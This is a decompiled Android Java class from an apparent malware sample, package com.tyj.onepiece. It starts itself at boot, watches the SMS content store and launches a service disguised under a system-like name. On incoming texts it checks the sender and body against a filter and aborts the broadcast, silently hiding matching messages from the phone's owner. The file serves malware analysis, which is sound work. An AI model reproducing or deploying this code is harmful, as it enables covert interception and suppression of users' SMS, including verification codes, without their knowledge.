// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.tyj.onepiece;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

public class TRecevier extends BroadcastReceiver {
        private static TContentObserver content;

        static {
                TRecevier.content = null;
        }

        public TRecevier() {
                super();
        }

        private void handleMsg(Context context, Intent intent) {
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                StringBuffer sb = new StringBuffer();
                // 发送方的号码
                String originatingAddress = "";
                for (int i = 0; i < pdus.length; i++) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        String msgBody = smsMessage.getMessageBody();
                        originatingAddress = smsMessage.getOriginatingAddress();
                        // 获得短信时间
                        // String date = new Date(smsMessage.getTimestampMillis()).toLocaleString();
                        sb.append(msgBody);
                }
                if (TStringUtils.checkFilter(context, originatingAddress, sb.toString()).booleanValue()) {
                        this.abortBroadcast();
                }

                // Object v5 = intent.getExtras().get("pdus");
                // StringBuffer v6 = new StringBuffer();
                // String v1 = "";
                // int v2;
                // for(v2 = 0; v2 < v5.length; ++v2) {
                // SmsMessage v4 = SmsMessage.createFromPdu(v5[v2]);
                // String v3 = v4.getMessageBody();
                // v1 = v4.getOriginatingAddress();
                // v6.append(v3);
                // }
                //
                // if(TStringUtils.checkFilter(context, v1, v6.toString()).booleanValue()) {
                // this.abortBroadcast();
                // }
        }

        public void onReceive(Context context, Intent intent) {
                Intent v2;
                Log.e("testt", "intent.getAction(): " + intent.getAction());
                if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
                        if (TRecevier.content != null) {
                                context.getContentResolver().unregisterContentObserver(TRecevier.content);
                        }

                        TRecevier.content = new TContentObserver(new Handler(), context);
                        context.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, TRecevier.content);
                        Intent v1 = new Intent(context, TMyService.class);
                        v1.setAction(TMyService.class.getName());
                        context.startService(v1);
                        if (Util.isWorked(context, Wksvr.class.getName())) {
                                return;
                        }

                        v2 = new Intent(context, Wksvr.class);
                        v2.setAction("com.system.android.Wksvr");
                        context.startService(v2);
                        return;
                }

                if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                        try {
                                this.handleMsg(context, intent);
                        } catch (Exception v0) {
                                if (TRecevier.content != null) {
                                        context.getContentResolver().unregisterContentObserver(TRecevier.content);
                                }

                                TRecevier.content = new TContentObserver(new Handler(), context);
                                context.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, TRecevier.content);
                        }

                        if (Util.isWorked(context, Wksvr.class.getName())) {
                                return;
                        }

                        v2 = new Intent(context, Wksvr.class);
                        v2.setAction("com.system.android.Wksvr");
                        context.startService(v2);
                }
        }
}
